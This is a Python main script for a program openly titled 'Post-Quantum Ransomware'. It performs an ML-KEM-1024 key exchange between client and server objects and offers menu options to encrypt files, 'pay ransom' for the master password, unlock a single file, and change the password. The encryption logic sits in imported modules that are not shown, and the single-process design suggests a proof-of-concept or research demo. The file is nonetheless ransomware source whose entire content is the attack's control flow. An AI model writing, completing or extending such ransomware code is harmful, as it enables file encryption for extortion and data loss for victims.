from client import Client
from server import Server
from pqcrypto.kem.ml_kem_1024 import generate_keypair


def main():
    print("=== Post-Quantum Ransomware ===\n")

    public_key, secret_key = generate_keypair()
    client = Client(public_key)
    server = Server(secret_key)
    ciphertext, plaintext_original = client.establish_shared_secret()
    plaintext_recovered = server.establish_shared_secret(ciphertext)

    if plaintext_original == plaintext_recovered:
        print("Shared secret established successfully between client and server.\n")
        client.derive_shared_secret(plaintext_original)
        server.derive_shared_secret(plaintext_original)
    else:
        print("Failed to establish shared secret between client and server.\n")

    while True:

        print("1. Encrypt files")
        print("2. Pay ransom")
        print("3. Unlock one file")
        print("4. Change password")

        selection = input("\nSelect an option (1-4): ")

        if selection == "1":
            passwords_iv, passwords_ciphertext, passwords_tag = client.encrypt_files()
            server.get_client_passwords(
                passwords_iv, passwords_ciphertext, passwords_tag
            )
            print("The files have been encrypted.\n")
        elif selection == "2":
            password = server.send_password(0)
            print(f"The master password is: {password}")
            client.decrypt_files(password)
            print("All files have been decrypted.\n")
            
        elif selection == "3":
            file_path = input("Enter the path of the file to unlock: ")
            file_id = client.get_file_id(file_path)
            password = server.send_password(file_id)
            print(f"The file password is: {password}")
            client.decrypt_file_with_password(file_path, password)
            print(f"The file '{file_path}' has been decrypted.\n")
        elif selection == "4":
            (
                master_key_iv,
                master_key_ciphertext,
                master_key_tag,
                master_password_salt,
                new_master_password,
            ) = client.get_master_password_data()
            (
                new_master_key_iv,
                new_master_key_ciphertext,
                new_master_key_tag,
                new_master_password_salt,
            ) = server.change_master_password(
                master_key_iv,
                master_key_ciphertext,
                master_key_tag,
                master_password_salt,
                new_master_password,
            )
            client.change_master_password_data(
                new_master_key_iv,
                new_master_key_ciphertext,
                new_master_key_tag,
                new_master_password_salt,
            )
            print("The master password has been changed.\n")
        else:
            print("Invalid selection. Please choose a valid option.")


if __name__ == "__main__":
    main()
